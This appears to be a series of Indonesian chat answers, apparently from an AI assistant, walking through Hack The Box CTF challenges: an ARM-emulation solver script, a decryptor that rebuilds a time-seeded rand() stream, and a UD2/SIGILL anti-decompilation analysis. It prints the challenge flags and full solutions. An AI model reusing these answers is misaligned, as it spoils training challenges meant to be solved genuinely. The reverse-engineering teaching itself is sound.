        print("[!] Server closed connection.")
        leftover = io.recvall(timeout=2)
        print(leftover.decode(errors="ignore"))
        break

    if not data:
        print("[!] No data received.")
        break

    text = data.decode(errors="ignore")
    print(text, end="")

    match = re.search(r"Level\s+(\d+)/50:\s*([0-9a-fA-F]+)", text)
    if not match:
        print("[!] Could not parse level/code.")
        print(io.recvall(timeout=2).decode(errors="ignore"))
        break

    level = int(match.group(1))
    hex_code = match.group(2)

    r0 = emulate_arm(hex_code)

    io.recvuntil(b":")
    print(f"Sending r0 = {r0}")
    io.sendline(str(r0).encode())

    if level == 50:
        print("[+] Final level answered. Reading final server response...")
        final = io.recvall(timeout=5)
        print(final.decode(errors="ignore"))
        break
```

---

## Kenapa ini menyelesaikan masalah?

Sebelumnya flow script kamu begini:

```text
Level 50 diterima
↓
emulate code
↓
kirim r0
↓
balik ke awal loop
↓
nunggu kata "Register"
↓
server sudah selesai / close
↓
EOFError
```

Padahal flow yang benar untuk level terakhir:

```text
Level 50 diterima
↓
emulate code
↓
kirim r0
↓
baca semua sisa output
↓
print flag
↓
exit
```

---

## Alternatif fix cepat banget

Kalau malas ubah banyak, cukup tambahkan ini setelah `io.sendline(...)`:

```python
if "Level 50/50" in text:
    print(io.recvall(timeout=5).decode(errors="ignore"))
    break
```

Jadi bagian bawahnya kira-kira:

```python
io.recvuntil(b":")
print(f"Sending r0 = {r0}")
io.sendline(str(r0).encode())

if "Level 50/50" in text:
    print(io.recvall(timeout=5).decode(errors="ignore"))
    break
```

---

Kalau setelah fix masih tidak keluar flag dan cuma close connection, berarti kemungkinan `r0 = 1291851879` untuk Level 50 itu dianggap salah oleh server. Tapi dari log ini, problem utamanya jelas: script belum menangani kondisi **setelah final level**.

Belum benar, bro. Bagian ini indentasinya salah:

```python
if "Level 50/50" in text:
print(io.recvall(timeout=5).decode(errors="ignore"))
break
```

`print(...)` dan `break` harus masuk ke dalam blok `if`, jadi harus di-indent 4 spasi.

Yang benar:

```python
    if "Level 50/50" in text:
        print(io.recvall(timeout=5).decode(errors="ignore"))
        break
```

Versi bawah script kamu yang benar:

```python
    io.recvuntil(b":")
    print(f"Sending r0 = {r0}")
    io.sendline(str(r0).encode())

    if "Level 50/50" in text:
        print(io.recvall(timeout=5).decode(errors="ignore"))
        break
```

Jadi full script-nya:

```python
from pwn import *
from unicorn import *
from unicorn.arm_const import *
import re

HOST = "154.57.164.66"
PORT = 31034

ADDRESS = 0x10000
MEM_SIZE = 2 * 1024 * 1024

def emulate_arm(hex_code: str) -> int:
    code = bytes.fromhex(hex_code)

    mu = Uc(UC_ARCH_ARM, UC_MODE_ARM)
    mu.mem_map(ADDRESS, MEM_SIZE)
    mu.mem_write(ADDRESS, code)

    mu.emu_start(ADDRESS, ADDRESS + len(code))

    return mu.reg_read(UC_ARM_REG_R0)

io = remote(HOST, PORT)

while True:
    data = io.recvuntil(b"Register", timeout=5)

    if not data:
        break

    text = data.decode(errors="ignore")
    print(text, end="")

    match = re.search(r"Level\s+\d+/50:\s*([0-9a-fA-F]+)", text)
    if not match:
        print(io.recvall(timeout=2).decode(errors="ignore"))
        break

    hex_code = match.group(1)
    r0 = emulate_arm(hex_code)

    io.recvuntil(b":")
    print(f"Sending r0 = {r0}")
    io.sendline(str(r0).encode())

    if "Level 50/50" in text:
        print(io.recvall(timeout=5).decode(errors="ignore"))
        break

io.interactive()
```

Catatan kecil: setelah pakai `recvall()` di level 50, `io.interactive()` biasanya sudah tidak terlalu perlu karena koneksi kemungkinan sudah ditutup server. Tapi tidak masalah kalau tetap ada. Lebih rapi bisa dihapus:

```python
# io.interactive()
```

Mantap bro 🔥 Kita bedah flow **ARMs Race** tadi dengan bahasa super gampang.

Bayangkan challenge itu seperti **guru matematika yang memberi 50 soal rahasia**. Tapi soalnya bukan ditulis seperti:

```text
2 + 3 x 5 = ?
```

Melainkan ditulis dalam bentuk kode aneh:

```text
370301e301150de346174ae3...
```

Nah tugas kita bukan nebak-nebak. Tugas kita adalah bikin “mesin kecil” yang bisa membaca kode itu dan menghitung jawabannya.

---

## 1. Kita lihat dulu bentuk datanya

Server ngasih ini:

```text
Level 1/50: 370301e301150de346174ae3...
Register r0:
```

Awalnya keliatan seperti hex random.

Tapi di reverse engineering, kalau lihat string panjang berisi karakter:

```text
0-9 dan a-f
```

itu biasanya **hexadecimal**.

Analogi gampangnya:

> Hex itu seperti tulisan sandi. Bukan kalimat biasa, tapi bisa diubah jadi byte/instruksi komputer.

Jadi kita tahu: ini bukan teks biasa, ini kemungkinan **kode mesin**.

---

## 2. Kita curiga ini kode ARM

Challenge namanya **ARMs Race**. Dari namanya saja sudah clue besar: **ARM**.

ARM itu jenis arsitektur CPU, seperti “bahasa mesin” yang biasa dipakai di banyak device, misalnya HP, IoT, embedded system.

Jadi kemungkinan besar hex tadi adalah:

```text
ARM machine code
```

Bukan password. Bukan hash. Bukan encrypted flag langsung.

Analogi:

> Server memberi kita resep masakan, tapi ditulis dalam bahasa robot ARM. Kita butuh robot ARM untuk membaca resep itu.

---

## 3. Kita cek instruksi pertama

Hex awalnya:

```text
370301e3
```

Komputer ARM membaca instruksi dengan format **little-endian**.

Artinya byte-nya dibaca kebalik per 4 byte:

```text
37 03 01 e3
```

menjadi:

```text
e3 01 03 37
```

atau sebagai angka:

```text
0xe3010337
```

Instruksi itu kalau di-disassemble menjadi kira-kira:

```asm
movw r0, #0x1337
```

Artinya:

```text
Masukkan angka 0x1337 ke register r0
```

Nah di sini kita yakin: ini memang kode ARM.

---

## 4. Apa itu register `r0`?

Register itu seperti **kotak kecil di dalam CPU** untuk menyimpan angka sementara.

Bayangkan CPU punya banyak kotak:

```text
r0, r1, r2, r3, ...
```

Server bertanya:

```text
Register r0:
```

Artinya:

> Setelah semua instruksi dijalankan, isi kotak `r0` berapa?

Analogi anak-anaknya:

> Kamu diberi kotak bernama `r0`. Lalu ada banyak instruksi seperti “isi kotak dengan 10”, “tambahkan 5”, “kalikan 3”, “xor dengan angka lain”. Setelah semua selesai, guru bertanya: isi kotak `r0` sekarang berapa?

---

## 5. Kenapa tidak dihitung manual?

Karena levelnya ada **50**.

Setiap level berisi banyak instruksi ARM. Kalau dihitung manual, capek dan rawan salah.

Contoh kira-kira instruksi di dalamnya bisa seperti:

```asm
movw r0, #0x1337
movw r1, #0x1234
movt r1, #0xabcd
eor  r0, r0, r1
add  r0, r0, r2
mul  r0, r0, r3
```

Itu seperti soal matematika panjang yang berubah-ubah 50 kali.

Jadi daripada kita jadi kalkulator manual, kita bikin program yang otomatis jadi “CPU ARM palsu”.

---

## 6. Kita pakai Unicorn Engine

Unicorn itu emulator CPU.

Sederhananya:

> Unicorn adalah robot pura-pura yang bisa bertingkah seperti CPU ARM asli.

Jadi kita beri dia kode hex dari server, lalu kita bilang:

```text
Jalankan instruksi ini dari awal sampai akhir.
```

Setelah selesai, kita tanya:

```text
Isi r0 berapa?
```

Itulah jawaban yang kita kirim ke server.

---

## 7. Flow script kita

Script kita melakukan ini terus-menerus:

```text
Connect ke server
↓
Terima Level 1
↓
Ambil hex code
↓
Ubah hex menjadi bytes
↓
Masukkan bytes ke emulator ARM
↓
Jalankan emulator
↓
Baca register r0
↓
Kirim nilai r0 ke server
↓
Lanjut Level 2
↓
Ulangi sampai Level 50
↓
Ambil flag
```

Analogi sehari-hari:

> Bayangkan server adalah guru yang memberi 50 soal. Script kita adalah murid super cepat yang punya kalkulator khusus ARM. Setiap guru kasih soal, murid memasukkan soal ke kalkulator, kalkulator memberi jawaban, murid langsung jawab. Setelah 50 soal benar, guru memberi hadiah: flag.

---

## 8. Bagian script paling penting

Ini bagian yang menerima kode dari server:

```python
data = io.recvuntil(b"Register", timeout=5)
```

Artinya:

> Baca data dari server sampai ketemu kata `Register`.

Kenapa sampai `Register`?

Karena format server seperti ini:

```text
Level 1/50: <hex panjang>
Register r0:
```

Jadi kita baca sampai sana dulu, baru ambil hex-nya.

---

Ini bagian yang mengambil hex dari teks:

```python
match = re.search(r"Level\s+\d+/50:\s*([0-9a-fA-F]+)", text)
```

Artinya:

> Cari tulisan `Level x/50:` lalu ambil deretan hex setelahnya.

Contoh:

```text
Level 1/50: 370301e3...
```

Yang diambil cuma:

```text
370301e3...
```

---

Ini bagian mengubah hex jadi byte asli:

```python
code = bytes.fromhex(hex_code)
```

Analogi:

> Mengubah tulisan sandi menjadi instruksi asli yang bisa dimakan emulator.

---

Ini bagian membuat CPU ARM palsu:

```python
mu = Uc(UC_ARCH_ARM, UC_MODE_ARM)
```

Artinya:

> Buat emulator ARM mode biasa, bukan Thumb.

---

Ini bagian menyiapkan memory:

```python
mu.mem_map(ADDRESS, MEM_SIZE)
mu.mem_write(ADDRESS, code)
```

Analogi:

> Kita siapkan meja kosong, lalu taruh kertas instruksi di atas meja itu.

CPU butuh memory untuk membaca instruksi. Jadi kita letakkan kode ARM di alamat tertentu.

---

Ini bagian menjalankan instruksi:

```python
mu.emu_start(ADDRESS, ADDRESS + len(code))
```

Artinya:

> Jalankan kode dari awal sampai akhir.

Analogi:

> Robot ARM membaca resep dari baris pertama sampai baris terakhir.

---

Ini bagian mengambil jawaban:

```python
return mu.reg_read(UC_ARM_REG_R0)
```

Artinya:

> Setelah semua instruksi selesai, lihat isi register `r0`.

Itulah jawaban yang diminta server.

---

Ini bagian mengirim jawaban:

```python
io.sendline(str(r0).encode())
```

Artinya:

> Kirim angka isi `r0` ke server.

---

## 9. Kenapa tadi error di level terakhir?

Sebelumnya script kamu begini:

```text
Level 50 dijawab
↓
Server selesai
↓
Script masih nunggu Level 51
↓
Server nutup koneksi
↓
Python error EOFError
```

Padahal tidak ada Level 51.

Jadi kita tambahkan:

```python
if "Level 50/50" in text:
    print(io.recvall(timeout=5).decode(errors="ignore"))
    break
```

Artinya:

> Kalau sudah level terakhir, jangan tunggu level berikutnya. Langsung baca sisa output server, print flag, lalu selesai.

Analogi:

> Setelah guru memberi soal ke-50 dan kamu jawab benar, jangan duduk menunggu soal ke-51. Langsung ambil hadiah dari guru.

---

## 10. Kenapa pakai socket, bukan browser?

Saat kamu buka di browser, browser otomatis mengirim request seperti:

```http
GET / HTTP/1.1
Host: 154.57.164.66
```

Server challenge ini bukan web app normal. Dia menunggu angka jawaban.

Jadi ketika browser mengirim `GET /`, server bingung dan bilang:

```text
Value not recognized
```

Analogi:

> Guru bertanya “berapa isi r0?”, tapi browser malah menjawab “GET / HTTP/1.1”. Ya jelas gurunya bilang jawaban tidak dikenali.

Makanya kita pakai `pwntools remote()` karena itu cocok untuk komunikasi raw TCP.

---

## Ringkasan super simpel

Challenge ini seperti:

```text
Server: Nih resep rahasia dalam bahasa ARM.
Kita: Oke, aku kasih ke emulator ARM.
Emulator: Setelah resep dijalankan, r0 = angka ini.
Kita: Kirim angka itu ke server.
Server: Benar, lanjut level berikutnya.
...
Server: 50 benar, nih flag.
```

Jadi yang kita lakukan bukan brute force, bukan nebak, bukan exploit ribet. Kita cuma:

```text
membaca kode ARM → menjalankannya di emulator → mengambil hasil register r0
```

Itulah inti reverse engineering-nya.

## CHAT 8
Flag-nya:

```text
HTB{vRy_s1MplE_F1LE3nCryp0r}
```

Flow reverse engineering yang aku ambil:

### 1. Ekstrak file ZIP

Challenge memberi ZIP dengan password `hackthebox`.

```bash
unzip -P hackthebox Simple_Encryptor.zip
cd rev_simpleencryptor
```

Isi folder:

```text
encrypt
flag.enc
```

`encrypt` adalah binary ELF Linux 64-bit, sedangkan `flag.enc` adalah file terenkripsi.

---

### 2. Cek struktur file terenkripsi

`flag.enc` berukuran 32 byte.

Byte awalnya:

```text
5a 35 b1 62 00 f5 3e 12 ...
```

Ini penting, karena ransomware/encryptor sering menyimpan metadata di awal file, misalnya key, IV, seed, atau timestamp.

---

### 3. Analisis binary `encrypt`

Aku cek fungsi-fungsi yang dipakai binary:

```bash
strings encrypt
nm -C encrypt
```

Fungsi penting yang muncul:

```text
fopen
fread
fwrite
srand
rand
time
```

Dari sini sudah kelihatan pola kuat:

```text
time() -> srand(seed) -> rand() -> enkripsi
```

Artinya program kemungkinan memakai random number generator dari C, lalu seed-nya berasal dari waktu.

---

### 4. Baca assembly fungsi `main`

Bagian penting dari program:

```asm
call time
mov seed, eax
call srand
```

Lalu untuk setiap byte flag:

```asm
rand()
ambil byte random paling bawah

plain_byte XOR random_byte

rand()
ambil rand() & 7

ROL byte tersebut sebanyak hasil rand() & 7
```

Jadi algoritma enkripsinya kira-kira:

```c
seed = time(0);
srand(seed);

for each byte:
    data[i] = data[i] ^ (rand() & 0xff);
    data[i] = rol8(data[i], rand() & 7);

write seed ke 4 byte pertama flag.enc
write encrypted data setelahnya
```

Kenapa 4 byte pertama `flag.enc` adalah seed? Karena assembly menunjukkan program menulis variabel seed dulu:

```asm
fwrite(&seed, 1, 4, file)
fwrite(encrypted_data, 1, size, file)
```

Jadi file terenkripsi punya format:

```text
[4 byte seed][ciphertext]
```

---

### 5. Balik proses enkripsi

Karena enkripsi:

```text
cipher = ROL8(plain XOR key, rot)
```

Maka dekripsinya harus dibalik urutannya:

```text
plain = ROR8(cipher, rot) XOR key
```

Dengan syarat kita memanggil `rand()` dalam urutan yang sama:

```c
key = rand() & 0xff;
rot = rand() & 7;
```

---

### 6. Script dekripsi

Aku buat decoder C kecil supaya `rand()` dan `srand()` cocok dengan glibc Linux:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static unsigned char ror8(unsigned char x, unsigned int r) {
    r &= 7;
    return (x >> r) | (x << (8 - r));
}

int main() {
    FILE *f = fopen("flag.enc", "rb");

    uint32_t seed;
    fread(&seed, 1, 4, f);

    fseek(f, 0, SEEK_END);
    long n = ftell(f) - 4;
    fseek(f, 4, SEEK_SET);

    unsigned char *buf = malloc(n + 1);
    fread(buf, 1, n, f);
    fclose(f);

    srand(seed);

    for (long i = 0; i < n; i++) {
        unsigned char key = rand() & 0xff;
        unsigned int rot = rand() & 7;

        buf[i] = ror8(buf[i], rot) ^ key;
    }

    buf[n] = 0;
    printf("%s\n", buf);
}
```

Compile dan jalankan:

```bash
gcc decrypt.c -o decrypt
./decrypt
```

Output:

```text
HTB{vRy_s1MplE_F1LE3nCryp0r}
```

Inti vulnerability-nya: program menyimpan seed `time()` langsung di awal file terenkripsi. Jadi kita bisa generate ulang stream `rand()` yang sama, lalu membalik XOR dan rotate.

Oke, bayangkan challenge ini seperti **kita menemukan brankas rusak akibat ransomware**.

Kita tidak punya isi asli brankasnya, tapi kita punya dua benda penting:

```text
encrypt   = mesin yang dulu dipakai untuk mengunci pesan
flag.enc  = pesan yang sudah terkunci
```

Tujuan kita: **pelajari cara mesin mengunci pesan, lalu balik prosesnya supaya pesan terbuka lagi.**

---

## Gambaran besar flow-nya

Aku melakukan ini:

```text
ZIP challenge
   ↓
Extract
   ↓
Dapat file encrypt dan flag.enc
   ↓
Pelajari cara kerja encrypt
   ↓
Temukan rumus enkripsinya
   ↓
Balik rumusnya
   ↓
Decrypt flag.enc
   ↓
Dapat flag
```

Flag akhirnya:

```text
HTB{vRy_s1MplE_F1LE3nCryp0r}
```

---

# 1. Buka ZIP challenge

Pertama kita ekstrak ZIP dengan password:

```bash
unzip -P hackthebox Simple_Encryptor.zip
```

Setelah dibuka, isinya ada dua file:

```text
encrypt
flag.enc
```

Analogi sederhananya:

```text
encrypt  = alat pembuat gembok
flag.enc = kotak yang sudah digembok
```

Karena kita punya alat pembuat gemboknya, kita bisa pelajari **bagaimana gemboknya dibuat**.

---

# 2. Cek jenis file `encrypt`

Aku cek file `encrypt`.

Hasilnya menunjukkan bahwa `encrypt` adalah program Linux 64-bit.

Artinya ini bukan teks biasa, tapi program biner yang harus dianalisis dengan reverse engineering.

Analogi:

```text
Kita tidak bisa langsung membaca isi mesin.
Kita harus bongkar mesinnya dan lihat roda giginya satu per satu.
```

---

# 3. Lihat petunjuk dari fungsi yang dipakai

Aku cek isi string dan fungsi yang dipakai program.

Muncul fungsi-fungsi penting seperti:

```text
fopen
fread
fwrite
time
srand
rand
```

Ini petunjuk besar.

Artinya program kemungkinan melakukan ini:

```text
buka file
baca data
ambil waktu sekarang
pakai waktu sebagai seed random
acak data
tulis hasilnya ke file
```

Analogi:

```text
Mesin ini mengunci pesan dengan bantuan dadu ajaib.
Tapi dadu ajaibnya tidak benar-benar acak.
Dadu itu mulai dari angka awal tertentu, yaitu seed.
```

Di C, fungsi ini biasanya berpasangan:

```c
srand(seed);
rand();
rand();
rand();
```

Kalau kita tahu `seed`, maka urutan angka random yang keluar akan sama persis.

---

# 4. Temukan bahwa seed disimpan di awal `flag.enc`

Ini bagian paling penting.

Dari hasil analisis assembly, program melakukan kira-kira seperti ini:

```c
seed = time(0);
srand(seed);

fwrite(&seed, 1, 4, output_file);
fwrite(encrypted_data, 1, size, output_file);
```

Artinya file `flag.enc` bentuknya begini:

```text
[4 byte seed][data terenkripsi]
```

Contohnya:

```text
flag.enc:
5a 35 b1 62 00 f5 3e 12 ...
```

Empat byte pertama:

```text
5a 35 b1 62
```

Itu bukan bagian flag. Itu adalah **seed random**.

Analogi anak-anaknya:

```text
Bayangkan maling mengunci peti dengan kode rahasia,
tapi dia menempelkan kertas kecil di depan peti berisi angka awal kodenya.

Jadi walaupun petinya terkunci, kita bisa tahu pola kuncinya.
```

Inilah kelemahan utamanya.

---

# 5. Pahami cara enkripsinya

Setelah membaca program, proses enkripsinya ternyata sangat sederhana.

Untuk setiap 1 huruf/byte dari flag, program melakukan dua hal:

```text
1. XOR byte dengan angka random
2. Putar bit byte tersebut ke kiri
```

Bentuk sederhananya:

```c
key = rand() & 0xff;
rotation = rand() & 7;

encrypted_byte = plain_byte ^ key;
encrypted_byte = rol8(encrypted_byte, rotation);
```

Mari pecah pelan-pelan.

---

## Apa itu XOR?

XOR bisa dianggap seperti **masker rahasia**.

Misalnya huruf asli adalah:

```text
H
```

Lalu diberi masker angka random.

Hasilnya jadi simbol aneh yang tidak bisa dibaca.

Tapi XOR punya sifat spesial:

```text
A XOR B = C
C XOR B = A
```

Analogi:

```text
Kalau kamu mengunci pintu dengan kunci nomor 7,
maka untuk membuka kamu pakai kunci nomor 7 yang sama.
```

Jadi XOR mudah dibalik asal kita tahu angka random-nya.

---

## Apa itu rotate left?

Setelah XOR, byte-nya diputar ke kiri.

Bayangkan byte seperti anak-anak berdiri melingkar membawa angka:

```text
10110010
```

Kalau diputar kiri 2 langkah, posisinya berubah:

```text
11001010
```

Ini bukan hilang, hanya **diputar**.

Kalau ingin membaliknya, kita tinggal putar ke arah sebaliknya.

```text
Enkripsi  : rotate left
Dekripsi : rotate right
```

Analogi:

```text
Kalau kamu memutar tutup botol ke kanan untuk menutup,
maka untuk membuka kamu putar ke kiri.
```

---

# 6. Urutan balik harus terbalik

Ini konsep penting banget.

Enkripsi melakukan:

```text
plain
  ↓ XOR
sementara
  ↓ rotate left
cipher
```

Maka dekripsi harus membalik dari langkah terakhir dulu:

```text
cipher
  ↓ rotate right
sementara
  ↓ XOR
plain
```

Analogi paling gampang:

Kalau pagi kamu melakukan:

```text
1. Pakai kaos
2. Pakai jaket
```

Maka saat melepas, urutannya harus:

```text
1. Lepas jaket
2. Lepas kaos
```

Tidak bisa lepas kaos dulu kalau jaket masih dipakai.

Jadi karena enkripsi terakhirnya adalah `rotate left`, maka dekripsi pertama harus `rotate right`.

---

# 7. Buat ulang random yang sama

Karena `flag.enc` menyimpan seed di 4 byte pertama, kita bisa melakukan:

```c
srand(seed);
```

Setelah itu, setiap kali kita memanggil:

```c
rand();
```

hasilnya akan sama persis seperti saat program mengenkripsi flag.

Analogi:

```text
Mesin random itu seperti playlist lagu.
Kalau kamu mulai dari seed yang sama,
urutan lagunya akan sama juga.
```

Jadi kita bisa mendapatkan ulang:

```text
random key byte pertama
random rotation pertama
random key byte kedua
random rotation kedua
...
```

Sama persis dengan yang dipakai ransomware.

---

# 8. Rumus dekripsi

Karena enkripsi tiap byte adalah:

```text
cipher = ROL(plain XOR key, rotation)
```

Maka dekripsinya:

```text
plain = ROR(cipher, rotation) XOR key
```

Urutannya:

```text
ambil byte terenkripsi
ambil key dari rand()
ambil rotation dari rand()
putar kanan dulu
XOR dengan key
dapat byte asli
```

Untuk setiap byte di `flag.enc`, kita ulangi proses ini.

---

# 9. Hasil akhirnya

Setelah semua byte dibalik, pesan terenkripsi berubah menjadi:

```text
HTB{vRy_s1MplE_F1LE3nCryp0r}
```

Itulah flag-nya.

---

## Inti kelemahan challenge ini

Kesalahan programnya adalah:

```text
Program menyimpan seed random di dalam file terenkripsi.
```

Jadi walaupun dia pakai random, random-nya bisa kita ulangi.

Analogi terakhir:

```text
Seseorang menyembunyikan permen di kotak terkunci.
Dia memakai pola kunci dari angka rahasia.
Tapi angka rahasianya dia tulis di depan kotak.

Jadi kita tinggal baca angka itu,
ikuti pola yang sama,
lalu buka kotaknya.
```

Kesimpulannya:

```text
flag.enc bukan mustahil dibuka,
karena encrypt memberi tahu cara mengunci,
dan flag.enc memberi tahu seed untuk membuka pola random-nya.
```

## CHAT 9
Siap. Anggap binary ini seperti **kotak terkunci**. Kita tidak tahu password-nya, tapi kotaknya meninggalkan banyak “petunjuk kecil” di dalamnya. Reverse engineering itu seperti jadi detektif: kita tidak langsung menebak password, tapi membaca jejak-jejak yang ditinggalkan program.

Flag akhirnya adalah:

```text
HTB{Itz_0nLy_UD2}
```

Sekarang kita bedah pelan-pelan.

---

## Gambaran besar flow program

Program ini kira-kira bekerja seperti ini:

```text
Kamu menjalankan program dengan password
        |
        v
Program cek: apakah kamu memberi 1 password?
        |
        v
Program cek: apakah panjang password 12 karakter?
        |
        v
Program membandingkan password dalam 4 potongan
        |
        v
Kalau semua potongan benar
        |
        v
Program mencetak: HTB{password}
```

Jadi sebenarnya program tidak menyimpan flag utuh langsung sebagai:

```text
HTB{Itz_0nLy_UD2}
```

Dia menyimpan password-nya dalam beberapa potongan kecil:

```text
Itz
_0n
Ly_
UD2
```

Lalu potongan-potongan itu digabung secara logika menjadi:

```text
Itz_0nLy_UD2
```

Kemudian dicetak sebagai:

```text
HTB{Itz_0nLy_UD2}
```

---

# 1. Kenapa pertama-tama kita ekstrak ZIP?

Karena challenge dari HTB biasanya dikasih dalam bentuk ZIP.

Kamu kasih info:

```text
pw zip: hackthebox
```

Maka langkah pertama adalah membuka bungkusnya dulu.

```bash
unzip -P hackthebox Behind_the_Scenes.zip
```

Ibaratnya kita punya hadiah di dalam kotak. Sebelum tahu isinya, kita harus buka kotaknya.

Setelah diekstrak, kita dapat file:

```text
behindthescenes
```

Nah, file inilah target reverse engineering kita.

---

# 2. Kenapa pakai command `file`?

Kita perlu tahu benda yang kita pegang itu apa.

```bash
file behindthescenes
```

Hasilnya memberi tahu:

```text
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

Ini artinya:

```text
ELF 64-bit
```

Program ini adalah program Linux 64-bit.

```text
x86-64
```

Instruksi mesinnya untuk arsitektur Intel/AMD 64-bit.

```text
not stripped
```

Ini penting. Artinya nama-nama fungsi masih ada. Misalnya fungsi `main` masih kelihatan. Kalau binary sudah `stripped`, nama fungsi biasanya hilang dan analisis jadi lebih susah.

Kenapa ini penting?

Karena sebelum membongkar rumah, kita mau tahu dulu rumahnya tipe apa: rumah kayu, rumah beton, atau apartemen. Cara membongkarnya beda-beda.

---

# 3. Kenapa pakai `strings`?

Program komputer sering menyimpan teks di dalamnya.

Misalnya:

```text
Password salah
Masukkan nama
HTB{%s}
```

Command `strings` mencari teks-teks yang bisa dibaca manusia di dalam binary.

```bash
strings -a behindthescenes
```

Dari sini muncul petunjuk:

```text
./challenge <password>
> HTB{%s}
strncmp
strlen
sigaction
segill_sigaction
```

Ini sangat penting.

Mari kita artikan satu-satu.

---

## `./challenge <password>`

Ini memberi tahu bahwa program ingin dijalankan dengan argumen password.

Jadi bentuk menjalankannya kemungkinan:

```bash
./behindthescenes sesuatu
```

Contoh:

```bash
./behindthescenes password123
```

---

## `strlen`

`strlen` adalah fungsi untuk menghitung panjang string.

Kalau program memakai `strlen`, kemungkinan besar dia mengecek:

```text
Apakah panjang password benar?
```

Misalnya:

```text
password harus 12 karakter
```

---

## `strncmp`

`strncmp` adalah fungsi untuk membandingkan string, tapi hanya beberapa karakter.

Contoh:

```c
strncmp(input, "ABC", 3)
```

Artinya:

```text
Apakah 3 karakter pertama input adalah ABC?
```

Kalau ada `strncmp`, biasanya program mengecek password bagian demi bagian.

---

## `> HTB{%s}`

Ini format cetak.

`%s` artinya akan diisi string.

Misalnya kalau password benar adalah:

```text
Itz_0nLy_UD2
```

Maka:

```text
HTB{%s}
```

menjadi:

```text
HTB{Itz_0nLy_UD2}
```

Dari `strings` saja kita sudah tahu arah besarnya:

```text
Program menerima password
Program mengecek panjang password
Program membandingkan password
Kalau benar, password dimasukkan ke format HTB{%s}
```

---

# 4. Kenapa melihat `.rodata`?

`.rodata` adalah bagian program yang biasanya menyimpan data tetap, seperti teks.

Nama `.rodata` artinya kurang lebih:

```text
read-only data
```

Data yang disimpan di sana biasanya tidak berubah saat program berjalan.

Kita pakai:

```bash
objdump -s -j .rodata behindthescenes
```

Di sana terlihat:

```text
Itz
_0n
Ly_
UD2
> HTB{%s}
```

Ini seperti menemukan potongan-potongan kertas di lantai:

```text
Potongan 1: Itz
Potongan 2: _0n
Potongan 3: Ly_
Potongan 4: UD2
```

Kalau disusun dari kiri ke kanan:

```text
Itz_0nLy_UD2
```

Kenapa kita belum langsung puas?

Karena bisa saja string itu cuma jebakan. Dalam CTF reverse engineering, string yang kelihatan kadang sengaja dibuat untuk menipu.

Jadi kita harus validasi lewat assembly: apakah benar program membandingkan input dengan potongan-potongan itu?

---

# 5. Kenapa melihat assembly `main`?

`main` adalah pintu masuk utama program C.

Kalau program adalah rumah, `main` itu pintu depannya.

Kita pakai:

```bash
objdump -d -M intel behindthescenes
```

Tujuannya untuk melihat instruksi asli yang dijalankan CPU.

Di dalam `main`, alurnya terlihat seperti ini.

---

## Pertama: cek jumlah argumen

Assembly-nya kira-kira berarti:

```c
if (argc != 2) {
    gagal;
}
```

Artinya program ingin dipanggil seperti ini:

```bash
./behindthescenes <password>
```

Bukan cuma:

```bash
./behindthescenes
```

Dan bukan juga:

```bash
./behindthescenes a b c
```

Harus tepat satu password.

---

## Kedua: cek panjang password

Terlihat pemanggilan:

```asm
call strlen
cmp rax, 0xc
```

`0xc` adalah angka hexadecimal.

Dalam desimal:

```text
0xc = 12
```

Jadi artinya:

```c
if (strlen(password) != 12) {
    gagal;
}
```

Password harus 12 karakter.

Coba hitung kandidat kita:

```text
I t z _ 0 n L y _ U D 2
1 2 3 4 5 6 7 8 9 10 11 12
```

Pas 12.

---

## Ketiga: cek password dalam 4 bagian

Program tidak membandingkan langsung begini:

```c
strcmp(password, "Itz_0nLy_UD2")
```

Tapi dia membandingkan per potongan:

```c
strncmp(password, "Itz", 3)
strncmp(password + 3, "_0n", 3)
strncmp(password + 6, "Ly_", 3)
strncmp(password + 9, "UD2", 3)
```

Mari kita buat sangat sederhana.

Password:

```text
Itz_0nLy_UD2
```

Kita beri nomor posisi:

```text
Posisi:  0 1 2 3 4 5 6 7 8 9 10 11
Char:    I t z _ 0 n L y _ U D  2
```

Lalu program mengecek:

```text
password + 0  -> Itz
password + 3  -> _0n
password + 6  -> Ly_
password + 9  -> UD2
```

Visualnya:

```text
Itz_0nLy_UD2
|||             harus sama dengan "Itz"

Itz_0nLy_UD2
   |||          harus sama dengan "_0n"

Itz_0nLy_UD2
      |||       harus sama dengan "Ly_"

Itz_0nLy_UD2
         |||    harus sama dengan "UD2"
```

Kalau semua benar, password valid.

---

# 6. Kenapa challenge-nya bernama “Behind the Scenes”?

Karena ada trik tersembunyi di balik layar.

Scenario bilang:

```text
Make decompilation harder.
```

Maksudnya pembuat challenge ingin membuat decompiler seperti Ghidra/IDA terlihat bingung.

Caranya: mereka menaruh instruksi aneh bernama `UD2`.

---

# 7. Apa itu `UD2`?

`UD2` adalah instruksi illegal di x86.

Anggap CPU seperti anak yang diberi daftar perintah:

```text
jalan
lompat
ambil
tulis
```

Lalu tiba-tiba diberi perintah:

```text
BLORB
```

CPU bingung karena `BLORB` bukan perintah yang valid.

Nah, `UD2` itu seperti perintah `BLORB`.

Kalau CPU menjalankan `UD2`, biasanya program akan crash dengan sinyal:

```text
SIGILL
```

`SIGILL` artinya:

```text
Illegal Instruction
```

Instruksi ilegal.

---

# 8. Tapi kenapa program tidak crash?

Karena program memasang “penjaga” untuk menangkap crash itu.

Di binary terlihat ada:

```text
sigaction
segill_sigaction
```

`sigaction` dipakai untuk memasang signal handler.

Signal handler itu seperti satpam.

Flow-nya begini:

```text
Program menjalankan UD2
        |
        v
CPU bilang: "Instruksi ilegal!"
        |
        v
Linux mengirim SIGILL
        |
        v
Handler segill_sigaction menangkap SIGILL
        |
        v
Handler menggeser RIP maju 2 byte
        |
        v
Program lanjut setelah UD2
```

---

# 9. Apa itu RIP?

`RIP` adalah register yang menunjukkan instruksi mana yang sedang dijalankan CPU.

Bayangkan program adalah buku resep:

```text
Baris 1: ambil telur
Baris 2: pecahkan telur
Baris 3: masukkan gula
Baris 4: aduk
```

`RIP` adalah jari yang menunjuk baris mana yang sedang dibaca.

Kalau `RIP` menunjuk ke `UD2`, program crash.

Handler lalu bilang:

```text
Jangan baca baris UD2 ini, lompat ke baris setelahnya.
```

Instruksi `UD2` panjangnya 2 byte.

Maka handler melakukan:

```text
RIP = RIP + 2
```

Artinya:

```text
Lewati UD2, lanjut ke instruksi berikutnya.
```

---

# 10. Kenapa ini bikin decompiler bingung?

Decompiler mencoba membaca program dan mengubah assembly menjadi pseudo-C.

Tapi saat melihat `UD2`, decompiler berpikir:

```text
Ini instruksi ilegal.
